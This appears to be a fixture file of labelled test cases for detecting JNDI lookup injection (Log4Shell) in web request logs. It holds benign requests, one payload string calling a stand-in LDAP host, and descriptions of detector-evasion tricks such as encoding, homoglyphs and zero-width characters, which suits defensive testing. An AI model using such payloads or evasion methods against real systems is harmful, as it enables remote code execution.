name: Benign home request
log: GET /home HTTP/1.1 Host: shop.local User-Agent: Mozilla/5.0
story: A normal web request with no lookup syntax.

name: Clean API request
log: GET /api/products?id=123 HTTP/1.1 Host: shop.local User-Agent: Mozilla/5.0
story: A benign API request used to show low-risk classification.

name: Static asset request
story: A static asset request that should stay benign.

name: Hard negative documentation
log: Security scanner report mentions \${jndi:ldap://example.com/a} as text
story: A documentation-like line that contains payload text but is not a runtime exploit attempt.

name: Mixed case payload
story: Case manipulation designed to bypass simple case-sensitive matching.

name: URL encoded payload
story: Encoded braces and separators are decoded by canonicalization.

name: Triple URL encoded payload
story: Repeated URL encoding tests whether shallow decoding is enough.

name: Unicode escape payload
story: Unicode escapes reconstruct the JNDI token.

name: Nested lower lookup
story: Nested lower lookups reconstruct the JNDI token.

name: Environment fallback
story: Environment fallback syntax recovers characters through default values.

name: Comment injection
story: Comment-like noise breaks the literal jndi token for simple signatures.

name: Homoglyph JNDI
story: A Unicode lookalike replaces the first JNDI character.

name: Zero-width JNDI
story: An invisible character is inserted inside the JNDI token.
